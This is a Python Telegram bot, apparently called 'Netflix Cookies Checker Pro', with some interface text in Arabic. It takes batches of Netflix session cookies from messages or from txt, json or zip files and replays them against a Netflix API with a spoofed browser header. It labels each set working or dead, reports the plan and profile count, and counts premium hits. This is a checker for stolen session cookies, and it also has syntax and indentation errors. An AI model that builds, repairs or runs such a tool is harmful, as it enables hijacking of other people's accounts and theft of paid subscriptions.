import os
import requests
import random
import time
import json
import zipfile
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ====================== CONFIG ======================
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))

total_checks = 0
live_count = 0
premium_count = 0

print("🚀 Netflix Cookies Checker Pro v3.2 Started")

# ====================== CHECK FUNCTION ======================
def check_netflix_cookies(cookies_text: str):
    global total_checks, live_count, premium_count
    total_checks += 1
    
    try:
        cookies = {}
        for line in cookies_text.splitlines():
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                key, value = line.split("=", 1)
                cookies[key.strip()] = value.strip()

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        }

        r = requests.get("https://www.netflix.com/api/shakti/mdx", 
                        cookies=cookies, 
                        headers=headers, 
                        timeout=15)

        if r.status_code == 200:
            live_count += 1
            try:
                data = r.json()
                plan = data.get("plan", {}).get("name", "Unknown")
                is_premium = "premium" in plan.lower() or "4k" in plan.lower() or "uhd" in plan.lower()
                
                if is_premium:
                    premium_count += 1
                
                return {
                    "status": "✅ WORKING",
                    "plan": plan,
                    "premium": "⭐️ PREMIUM" if is_premium else "Normal",
                    "profiles": len(data.get("profiles", {}))
                }
            except:
                return {"status": "✅ WORKING (Basic)"}
        else:
            return {"status": "❌ DEAD"}

    except Exception as e:
        return {"status": "⚠️ ERROR", "reason": str(e)[:60]}

# ====================== HANDLE ZIP FILE ======================
def extract_zip(file_path):
    results = []
    with zipfile.ZipFile(file_path, 'r') as z:
        for file_info in z.namelist():
            if file_info.endswith(('.txt', '.json')):
                with z.open(file_info) as f:
                    content = f.read().decode('utf-8', errors='ignore')
                    results.append(content)
    return results

# ====================== HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied!")
        return
    await update.message.reply_text(
        "🤖 Netflix Cookies Checker Pro v3.2\n\n"
        "• أرسل كوكيز (نص)\n"
        "• أرسل ملف txt/json/zip\n\n"
        "/stats - إحصائيات\n"
        "/premium - Premium Filter ON/OFF"
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    success_rate = round((live_count / total_checks) * 100, 2) if total_checks > 0 else 0
    await update.message.reply_text(
        f"📊 Bot Statistics\n\n"
        f"Total Checks: {total_checks}\n"
        f"✅ Live: {live_count}\n"
        f"⭐️ Premium: {premium_count}\n"
        f"Success Rate: {success_rate}%\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    # Handle Document (txt, json, zip)
    if update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{update.message.document.file_name}"
        await file.download_to_drive(file_path)
if file_path.endswith('.zip'):
            contents = extract_zip(file_path)
            for content in contents[:10]:  # Limit to 10 for safety
                result = check_netflix_cookies(content)
                await update.message.reply_text(f"{result.get('status')} - {result.get('plan', '')}")
        else:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            result = check_netflix_cookies(content)
            await update.message.reply_text(str(result))

        os.remove(file_path)
        return

    # Handle Text Message
    text = update.message.text.strip()
    await update.message.reply_text("🔄 جاري الفحص...")
    result = check_netflix_cookies(text)
    
    msg = f"{result.get('status', 'Unknown')}\n"
    if "plan" in result:
        msg += f"📌 Plan: {result['plan']}\n"
    if "premium" in result:
        msg += f"⭐️ {result['premium']}\n"
    
    await update.message.reply_text(msg)

# ====================== MAIN ======================
if name == "main":
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))

    print("Bot is running...")
    app.run_polling()
